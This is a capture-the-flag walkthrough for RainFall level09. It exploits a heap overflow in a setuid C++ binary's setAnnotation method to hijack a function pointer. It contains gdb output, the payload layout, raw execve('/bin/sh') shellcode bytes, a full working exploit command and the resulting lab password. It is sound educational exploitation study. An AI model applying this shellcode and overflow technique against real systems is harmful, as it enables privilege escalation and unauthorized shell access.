# level09 — walkthrough

## 1. First look

The binary is setuid `bonus0` and seems to do nothing when run:

```
level9@RainFall:~$ ls -l
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
level9@RainFall:~$ ./level9
level9@RainFall:~$ ./level9 bla
```

In gdb it's a C++ binary with an `N` class and these functions:

- `N::N(int)` — constructor
- `N::setAnnotation(char*)`
- `N::operator+(N&)`
- `N::operator-(N&)`
- `main`

There is **no call to `/bin/sh`** anywhere, so we supply our own **shellcode**.

## 2. The bug

`main` makes two `N` objects, copies `argv[1]` into the first, then calls a function through the second object's pointer:

```c
this    = operator_new(0x6c);          // object 1 (0x6c = 108 bytes)
N::N(this, 5);
this_00 = operator_new(0x6c);          // object 2
N::N(this_00, 6);
N::setAnnotation(this, argv[1]);       // memcpy(this+4, argv[1], strlen(argv[1])) — NO length check
(*(code*)**this_00)(this_00, this);    // calls a function via object 2's pointer
```

`setAnnotation` copies our input with no bound. Object 1 is 108 bytes, so a longer input overflows **out of object 1 and into object 2**, whose first 4 bytes are the pointer that gets called. This is a heap buffer overflow.

## 3. Find the offset

Feed a non-repeating pattern, crash it, see which bytes land in the called pointer:

```
run $(python -c 'print "A"*108 + "BBBB"')
Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info register eax
eax            0x41366441       1094083649
```

`eax` holds our pattern bytes. Looking up `0x41366441` in the pattern gives **offset 108** — which matches the object size `0x6c` (108). So byte 108 of our input is the first byte of object 2's pointer.

## 4. How the call works (why we need two addresses)

Disassembling `main`, the call dereferences **twice** before calling:

```
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax

```
or 
``` (*(code *)**(undefined4 **)this_00)(this_00,this);```

So the value we plant at offset 108 is dereferenced twice, then called. Our planted value must therefore be a **pointer to a pointer**: it points to a spot in our buffer, and that spot holds the address of our shellcode.

## 5. Find where our buffer lives

Break right after `setAnnotation` and look at where our input was copied:

```
(gdb) b *main+136
(gdb) run 'AAAA'
Breakpoint 1, 0x0804867c in main ()
(gdb) x $eax
0x804a00c:      0x41414141          ; our buffer starts at 0x0804a00c
```
that's the memcopy buffer. 
Our input starts at **`0x0804a00c`**. So:

- `0x0804a00c` — start of our buffer. The first 4 bytes here hold a pointer; this is also the address we plant at offset 108.
- `0x0804a010` — `0x0804a00c + 4`. The first 4 bytes are used for a pointer, so the shellcode body starts here.

## 6. Build the payload

Memory layout once our input is copied in:

```
0x0804a00c:  [ address 0x0804a010 ]   ← first 4 bytes = a POINTER (to the shellcode)
0x0804a010:  [ shellcode ]            ← the actual code, 28 bytes
   ...       [ padding = AAAA... ]    ← filler
0x0804a078:  [ address 0x0804a00c ]   ← last 4 bytes, at offset 108 (overwrites object 2's pointer)
```

Confirm the overwrite address with gdb's hex calculator:

```
(gdb) p/x 0x0804a00c + 108
$1 = 0x804a078
```

Payload = `[shellcode addr] [shellcode] [padding] [buffer addr]`:

| part | bytes | value |
|---|---|---|
| shellcode addr | 4 | `0x0804a010` |
| shellcode | 28 | `execve("/bin/sh")` |
| padding | 76 | `A`×76 |
| buffer addr | 4 | `0x0804a00c` |

`4 + 28 + 76 = 108`, so the buffer address lands exactly at offset 108.

Execution trace:

- offset 108 holds `0x0804a00c` → read into `eax`
- `mov eax,[eax]` reads `0x0804a00c` → gets our first 4 bytes = `0x0804a010`
- `mov edx,[eax]` / `call edx` → calls `0x0804a010` → our shellcode → `/bin/sh`

Addresses are little-endian:
- `0x0804a010` → `\x10\xa0\x04\x08`
- `0x0804a00c` → `\x0c\xa0\x04\x08`

No NOP sled is needed: we jump to the exact first byte of the shellcode, and the addresses are stable (No PIE — see below).

## 7. The shellcode

28-byte `execve("/bin/sh")`, from https://shell-storm.org/shellcode/files/shellcode-827.html

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

What it does: pushes `/bin//sh` onto the stack and points `ebx` at it, zeroes the other args, sets `al = 0x0b` (syscall 11 = `execve`), and `int 0x80` makes the syscall — giving a shell.

## 8. Run it

```
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*76 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

## Why it works (checksec)

```
No RELRO   No canary   NX disabled   No PIE
```

- **NX disabled** → the heap is executable, so shellcode placed in our buffer can run.
- **No PIE** → the binary loads at fixed addresses, so `0x0804a00c` / `0x0804a010` are stable and can be hardcoded.

## Summary

`setAnnotation` copies `argv[1]` into a 108-byte object with no length check. We overflow out of object 1 into object 2 and overwrite the function pointer the program calls. Because that call dereferences twice, our payload is a pointer-to-a-pointer: the value at offset 108 (`0x0804a00c`) points back into our buffer, whose first 4 bytes (`0x0804a010`) point at our shellcode. The hijacked call runs the shellcode → shell as `bonus0`.